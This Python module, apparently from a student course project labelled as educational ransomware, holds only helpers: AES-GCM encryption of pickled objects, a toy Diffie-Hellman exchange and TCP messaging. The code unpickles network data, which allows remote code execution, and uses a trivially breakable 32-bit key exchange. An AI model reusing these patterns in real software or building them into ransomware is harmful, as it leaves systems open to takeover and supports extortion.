# --------------------------------------------
# Ransomware Project for educational purposes
# Course : Security integration
# Bloc : 1
# Group : IS4
# Class : security
# --------------------------------------------
# Importations
# --------------------------------------------
from Cryptodome.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.Padding import unpad
from Crypto.Util.number import getPrime
from random import randint
from Cryptodome.Random import get_random_bytes
from hashlib import sha256
import pickle


# --------------------------------------------
# Classes
# --------------------------------------------

def gen_key(size=16):
    key = get_random_bytes(size)
    return key

def crypt(textMsg, key):
    header = b"header_AES_GCM"
    cipher = AES.new(key, AES.MODE_GCM)
    cipher.update(header)
    ciphertext, tag = cipher.encrypt_and_digest(pad(pickle.dumps(textMsg), AES.block_size))
    return [cipher.nonce, header, ciphertext, tag]

def decrypt(cryptMsg, key):
    cipher = AES.new(key, AES.MODE_GCM, nonce=cryptMsg[0])
    cipher.update(cryptMsg[1])
    return pickle.loads(unpad(cipher.decrypt_and_verify(cryptMsg[2], cryptMsg[3]), AES.block_size))


def diffie_hellmand_sendk(conn_client):
    g = randint(9,99)
    p = getPrime(32)
    secret_key_a = randint(1,10)
    public_key_a = (g ** secret_key_a) % p
    msg_init = {'g': g, 'p': p, 'A': public_key_a}
    send_msg(conn_client, msg_init)
    msg_resp = recv_msg(conn_client)
    public_key_b = msg_resp['B']

    key_calculate_a = (public_key_b ** secret_key_a) % p

    return sha256(str(key_calculate_a).encode()).digest()


def diffie_hellman_recv_key(conn_srv):
    msg_init = recv_msg(conn_srv)
    g = msg_init['g']
    p = msg_init['p']
    public_key_a = msg_init['A']
    secret_key_b = randint(11, 20)
    key_calculate_b = (public_key_a ** secret_key_b) % p
    send_msg(conn_srv, {'B': (g ** secret_key_b) % p})

    return sha256(str(key_calculate_b).encode()).digest()

def send_msg(c, message, HEADERSIZE=10):
    """
    Créer un header pour la connexion TCP afin de savoir de où à où lire
    """
    serialized_payload = pickle.dumps(message)
    c.sendall(bytes(f"{len(serialized_payload):<{HEADERSIZE}}", 'utf-8'))
    c.sendall(serialized_payload)


def recv_msg(c, HEADERSIZE=10):
    data_size = int(float(c.recv(HEADERSIZE)[0:HEADERSIZE]))
    received_payload = b""
    reamining_payload_size = data_size
    while reamining_payload_size != 0:
        received_payload += c.recv(reamining_payload_size)
        reamining_payload_size = data_size - len(received_payload)
    payload = pickle.loads(received_payload)
    return payload